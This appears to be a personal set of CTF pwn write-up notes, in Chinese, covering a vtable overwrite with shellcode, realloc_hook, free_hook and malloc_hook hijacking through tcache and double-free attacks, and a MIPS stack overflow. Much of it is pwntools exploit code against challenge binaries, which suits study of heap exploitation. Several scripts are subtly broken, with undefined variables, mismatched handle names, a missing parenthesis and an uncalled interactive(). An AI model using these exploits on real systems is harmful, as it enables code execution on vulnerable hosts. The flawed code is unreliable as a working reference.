---
title: "虚函数与 malloc_hook 利用"
date: 2025-07-25
categories:
  - 二进制安全
  - 堆利用
tags:
  - pwn
  - heap
  - vtable
  - malloc_hook
---

# garden
虚函数。虚函数在开头有个指针列表，用来维护虚函数的指针

虚表指针对应类的虚函数表地址

通过基类调用虚函数时，对象的虚表指针找到对应的虚函数表。调用表内的相应地址，实现动态绑定。

纯虚函数是在基类里面定义但没有实现的类。

没有实现的类的主要作用是作为接口的定义，强制派生类必须实现纯虚函数。

c＋＋里有虚函数，c语言里有类似的定义和实现，好像也是为了实现和c＋＋里虚函数一样的功能

main函数。中间的listen是用来调用虚函数的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064610-4308d5d3-b338-46ce-be5d-2a36cf283727.png)

看一下remove。没有uaf，它做了处理。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064685-1a020891-b794-4caa-88e7-740d1f109266.png)

一开始找不见漏洞。没有uaf，堆溢出也不知道溢出哪个

Checksec 一下发现没有nx。方便写shellcode


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064690-3462c9a7-3cbb-46bc-94f8-676b3826d346.png)

看一看别的部分

[Strcpy 是一个危险的函数](https://hnusec-star.feishu.cn/wiki/DLs2wG4YgiBdDZkISqMcx0cQn8g)。

看到这个std这，它使用了一个strcpy函数。可以进行堆溢出


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064737-2cc9dcdb-4add-4f32-baa7-387ef7cea763.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064758-9b2c0628-caf7-4453-be64-b29ebfdeaf77.png)

那就是用这个函数来一个堆溢出，然后覆盖掉。用虚表指针指向shellcode执行bin/sh就行

最后要调一下listen函数调用一下vptr指针。

```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p=process("./garden")
elf=ELF('./garden')

shellcode = asm('''
    xor    rax, rax        
    push   rax             
    push   0x68732F2F      
    push   0x6E69622F      
    mov    rdi, rsp        
    xor    rsi, rsi        
    xor    rdx, rdx        
    mov    al, 0x3B        
    syscall                
''')

def add(name,weight):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(name)
    p.recvuntil(":")
    p.sendline(str(weight))
    
def remove(idx):
    p.recvuntil(":")
    p.sendline("5")
    p.recvuntil(":")
    p.sendline(str(idx))
    
bss=0x605420
p.recvuntil(":")
p.sendline(b'a'*8+p64(name+8)+shellcode)

add(b'A'*8,0)
add(b'B'*8,1)
    
remove(0)

fake_ptr=name+8
add(b'a'*72+p64(fake_ptr),2)

p.recvuntil(":")
p.sendline("3")
p.recvuntil(":")
p.sendline(b'0')

p.interactive()
```

# realloc_hook
realloc_hook 用free_hook写的。用realloc_hook的话libc泄露前面应该是一样的

泄露libc之后的通过tcache_攻击让malloc指到realloc_hook-0x10这个地方的chunk

继续把这个chunk改成system。最后有bin/sh的chunk调用realloc。触发bin/sh

```plain
realloc_hook = libc_base + libc.sym['__realloc_hook']
system_addr  = libc_base + libc.sym['system']

#tcache_realloc_hook
delete(1)
payload = b'A'*0x68 + p64(0x71) + p64(realloc_hook - 0x10)
edit(0, 0x78, payload)
add(3, 0x60)
add(4, 0x60)

edit(4, 0x8, p64(system_addr))

add(5, 0x20)
edit(5, 0x8, b'/bin/sh\x00')
choice(3)
io.recvuntil(b'Sanctum for arcane inscription:\n')
io.sendline(b'5')
io.recvuntil(b'Runic sequence length:\n')
io.sendline(b'0x30')  
io.interactive()
```

# EZ3
ida没有mips的编译，照着添加了之后只能在终端里输出。下了一个新的ghidra直接看


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065255-36b2f3f9-c5a6-4a55-be1c-0f00304ad0a5.png)

ida这个终端输出的不知道是什么。直接用ghidra看吧。main函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065575-28a04e17-6336-4f6b-aa14-05380fe78d21.png)

分析以后是栈溢出。有后门，用栈溢出的方法来做

mips是一种新的汇编，要先学习一下对应的指令。

看一下指令集https://www.tarikvon.cn/2024/05/25/MIPS/

```plain
from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
io = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", "./EZ3.0"])
elf = ELF("./EZ3.0")

binsh = 0x0411010
lw = 0x00400a20
system_addr = 0x00400B70 

payload = b'a' * 36
payload += p32(lw)
payload += p32(0)
payload += p32(system_addr)
payload += p32(binsh_cat)
io.sendafter(">", payload)
io.interactive()
```

# （七月第四周）
# malloc_hook
看一下

main函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101946-163e5d87-5f7b-41bd-bd45-691c0dcc6d17.png)

欢迎，菜单函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101895-b9d977e6-196e-486f-8c32-0fad3a5d2e90.png)

free函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101973-df7c30fb-7417-4d7c-bc68-508057e27192.png)

add函数。好像只能最多加16个。大小是大于0x0小于0x128的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101903-a3a7b507-6dcc-423f-88be-b49dc8becc7e.png)

有一个change_name函数。它可以往bss上读数据。可以读0xd0。可以打印对应的bss数据


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101968-29d29a98-bcf8-44c2-b8b0-f18f8e857bf6.png)

用change_name来打印libc。覆盖到malloc_hook。在这之前先把malloc函数改成bin/sh或者onegadget。

要泄露libc的话这是用的unsorted bin attarct。在bss上构造一个假的堆。感觉跟栈迁移有点像。

劫持返回地址用double free。先来一次double free把地址改到bss。

再在bss上伪造大堆，让它free掉进入unsorted bin 。再溢出假的堆。一直覆盖到跟main arana连的指针用change name函数打印出来libc

之后就是再double free一遍。把地址改到hook这。用libc算一下onegadget的地址。hook改成onegadget的。发送数据调用hook就能执行onegadget了

wp里面debug这一段不知道是干啥的

```plain
def dbg():
    gdb.attach(io)
io.recv()
payload = p64(0) + p64(0x7F)
payload = payload.ljust(0x70, b"\x00")
payload += p64(0x7F)
io.sendline(payload)
```

```plain
#假的堆的情况
偏移 0x00: 0x0000000000000000  ← prev_size
偏移 0x08: 0x0000000000000091  ← size (0x90字节 + prev_inuse标志)
偏移 0x10-0x97: "aaaa..."      ← 填充数据
偏移 0x98: 0x0000000000000021  ← 伪造的下一个chunk的size
偏移 0xa0: 0x0000000000000000  ← 伪造的prev_size
偏移 0xa8: 0x0000000000000000  ← 伪造的fd
偏移 0xb0: 0x0000000000000000  ← 伪造的bk  
偏移 0xb8: 0x0000000000000021  ← 再下一个chunk的size
```

```plain
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
io = process('./malloc')
elf = ELF("./malloc")
libc = ELF("libc.so.6")

def dbg():
    gdb.attach(io)
#io.recv()
#payload = p64(0) + p64(0x7F)
#payload = payload.ljust(0x70, b"\x00")
#payload += p64(0x7F)
#io.sendline(payload)

def add(size, content):
    io.recvuntil(b"> ")
    io.sendline(str(1))
    io.recvuntil(b"> ")
    io.sendline(str(size))
    io.recvuntil(b"> ")
    io.sendline(content)
def free(idx):
    io.recvuntil(b"> ")
    io.sendline(str(2))
    io.recvuntil(b"> ")
    io.sendline(str(idx))
def change(con):
    io.recvuntil(b"> ")
    io.sendline(str(3))
    io.recvuntil(b"> ")
    io.sendline()
    
add(0x60, b"a")  # 0
add(0x60, b"a")  # 1
add(0x60, b"a")  # 2
free(0)
free(1)
free(0)
add(0x60, p64(0x6020c0))  # 3
add(0x60, b"a")  # 4
add(0x60, b"a")  # 5
add(0x60, b"a")  # 6

payload = p64(0) + p64(0x91)
payload = payload.ljust(0x98, b"a")
payload += p64(0x21) + p64(0) * 3 + p64(0x21)
change(payload)
free(6)
payload = b"a" * 0xF + p8(0x91)
new(payload)
libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3C4B78
info("libc base: " + hex(libc.address))
change(p64(0) + p64(0x21))

free(1)
free(0)
free(1)
add(0x60, p64(libc.sym["malloc_hook"] - 0x23))  # 7
add(0x60, b"a")
add(0x60, b"a")
add(0x60, b"a" * 0x13 + p64(libc.address + 0xf03a4)

io.recv()
io.sendline(str(1))
io.recvuntil(b"> ")
io.sendline(str(0x60))
io.interactive()
```

# realloc_hook
main函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102509-ad99d450-8e5c-4215-987e-b1f62473ceb3.png)

add函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102544-db59ed7a-3ff2-40e5-aaf9-d9080fb4c63a.png)

free 指针没有置空


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102567-71f9a4c6-8f9a-4c09-a3ac-a14a011d31d0.png)

有edit函数。它返回的read可以溢出


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102733-3b9caac5-e549-461f-9f7c-7791a1d3a6e7.png)

可以puts的函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102703-70c5a6a8-ca2b-4794-bc1d-1b78e7a9bf1d.png)

如果是高版本的glibc，可以tcache bin attack 直接覆盖掉指针。

我们先uaf泄露libc，用unsorted bin 然后算出来libc的地址以后算system.因为有edit函数。我们就不用onegadget了。直接用edit把堆的内容改成system bin/sh 然后执行就可以


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531103085-4c4ab0ee-2c49-41b0-b88a-9e8e19bb6cfd.png)

```plain
from pwn import * 

context(log_level="debug", arch="amd64", os="linux")
io=process('./realloc')
libc=ELF('./libc.so.6')


def add(idx,size):
    p.sendlineafter('Chant your choice:',b'1')
    p.sendlineafter('Celestial alignment coordinate:',str(idx))
    p.sendlineafter('Quantum essence required:',str(size))
def free(idx):
    p.sendlineafter('Chant your choice:',b'2')
    p.sendlineafter('Cursed sanctum to cleanse:',str(idx))
def edit(idx,size,content):
    p.sendlineafter('Chant your choice:',b'3')
    p.sendlineafter('Sanctum for arcane inscription:',str(idx))
    p.sendlineafter('Runic sequence length:',str(size))
    p.sendafter('Inscribe your primordial truth:',content)
def puts(idx):
    p.sendlineafter('Chant your choice:',b'4')
    p.sendlineafter('Sanctum to reveal cosmic truth:',str(idx))
    

add(0,0x68)
add(1,0x68)
add(2,0x410)
add(3,0x68)

free(2)
puts(2)

main_arena = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
malloc_hook = main_arena-96-0x10
libc_base = malloc_hook-libc.sym['__malloc_hook']
fake = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']

free(1)
edit(1,0x100,p64(fake))
add(1,0x68)
add(4,0x68)
edit(4,0x100,p64(system))
edit(3,0x100,p64('/bin/sh\x00'))
free(3)
p.interactive
```

[main_arena与malloc的偏移](https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc)

伪造假的堆。

```plain
add(0,0x30)
add(1,0x30)
add(2,0x30)
add(3,0x430)
add(4,0x30)
delete(4)
delete(3)

fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(0)*7+p64(0x441)
edit(0,0x40,fake_chunk)
add(1,0x420)
show(1)
p.recv(8)
main_arena=u64(p.recv(6).ljust(8,b'\x00'))-96-1024
print(hex(main_arena))
libc_base=main_arena-0x3ebc40
print(hex(libc_base))
free_hook=libc_base+libc.symbols['__free_hook']
print(hex(free_hook))
system_addr=libc_base+libc.symbols['system']
delete(1)
delete(2)

fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(free_hook)
edit(0,0x100,fake_chunk)
```

有的偏移还不是很清楚。上面这个假堆的0x3ebc40和减的1024是什么还不知道。在libc 文件里的malloc trim函数里也没找见

# garden